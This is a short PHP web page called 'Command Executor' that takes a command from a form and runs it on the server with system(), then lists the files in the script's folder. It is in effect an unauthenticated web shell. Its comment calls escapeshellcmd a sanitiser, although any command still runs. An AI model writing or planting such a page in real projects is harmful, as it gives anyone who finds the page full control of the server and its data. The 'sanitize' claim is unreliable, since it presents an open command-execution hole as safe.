<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Executor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 40px;
        }
        h1 {
            color: #333;
        }
        form {
            margin-bottom: 20px;
        }
        textarea {
            width: 100%;
            height: 200px;
            padding: 10px;
            font-family: monospace;
            border: 1px solid #ddd;
            background-color: #f9f9f9;
        }
        input[type="text"] {
            width: 60%;
            padding: 10px;
            border: 1px solid #ccc;
            margin-bottom: 10px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <h1>Command Executor</h1>
    <p>Enter a system command below and click "Execute" to run it.</p>

    <!-- Form to input system command -->
    <form method="POST">
        <label for="cmd">Enter Command:</label><br>
        <input type="text" name="cmd" id="cmd" required><br>
        <input type="submit" value="Execute">
    </form>

    <?php
    // Handle command execution
    if (isset($_POST['cmd'])) {
        echo "<h2>Command Output:</h2>";
        echo "<textarea readonly>";
        // Sanitize and execute the command
        $cmd = escapeshellcmd($_POST['cmd']);
        system($cmd);
        echo "</textarea>";
    }

    // Display the contents of the user's folder
    echo "<h2>Contents of Your Folder:</h2>";
    $user_folder = __DIR__; // This is the current script directory, which is the user's folder
    $files = scandir($user_folder);

    echo "<ul>";
    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            echo "<li>$file</li>";
        }
    }
    echo "</ul>";
    ?>
</body>
</html>
